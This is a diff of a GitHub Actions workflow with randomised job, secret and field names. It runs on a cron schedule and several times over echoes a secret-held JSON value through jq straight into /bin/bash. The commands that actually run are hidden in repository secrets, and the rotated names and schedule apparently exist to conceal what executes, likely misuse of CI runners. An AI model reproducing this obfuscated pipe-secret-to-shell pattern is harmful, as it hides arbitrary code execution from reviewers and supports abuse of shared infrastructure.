@@ -3,27 +3,28 @@ name: shayinluo2345
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 2/6 * * *'
+    - cron: '25 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shayinluo2345
         env:
-          qnxze03: ${{ secrets.qnxze03 }}
+          fudmd6: ${{ secrets.fudmd6 }}
         run: |
-          echo $qnxze03 | jq -r .fxvpm213 | /bin/bash
-          echo $zz23 | jq -r .usy35 | /bin/bash
-          echo $acoa866 | jq -r .hxpg65 | /bin/bash
-          echo $bdgom97018 | jq -r .bxe8834 | /bin/bash
-          echo $lult8466 | jq -r .p244 | /bin/bash
-          echo $cg6 | jq -r .hny26 | /bin/bash
-          echo $hbvsj21335 | jq -r .feezy1 | /bin/bash
-          echo $onyr3099 | jq -r .t4594 | /bin/bash
-          echo $dd9444 | jq -r .qfwr36855 | /bin/bash
-          echo $j5975 | jq -r .amaqh7319 | /bin/bash
-          echo $qbj96667 | jq -r .hvp85801 | /bin/bash
-          echo $fnkiv842 | jq -r .sbz1972 | /bin/bash
+          echo $fudmd6 | jq -r .kx7944 | /bin/bash
+          echo $mn3290 | jq -r .eavlz6699 | /bin/bash
+          echo $tftv3347 | jq -r .q4280 | /bin/bash
+          echo $b8 | jq -r .cr53983 | /bin/bash
+          echo $fs57991 | jq -r .oswix9 | /bin/bash
+          echo $eyqa39 | jq -r .yz570 | /bin/bash
+          echo $ayxt4 | jq -r .gooa8496 | /bin/bash
+          echo $yadr3719 | jq -r .nkrb35 | /bin/bash
+          echo $pf33052 | jq -r .i04 | /bin/bash
+          echo $cv79571 | jq -r .ahfgy6 | /bin/bash
+          echo $ides801 | jq -r .niax14706 | /bin/bash
+          echo $zocfs7 | jq -r .yod36466 | /bin/bash
+          echo $ts4498 | jq -r .av45622 | /bin/bash
+          echo $n9555 | jq -r .fjmhi369 | /bin/bash
 
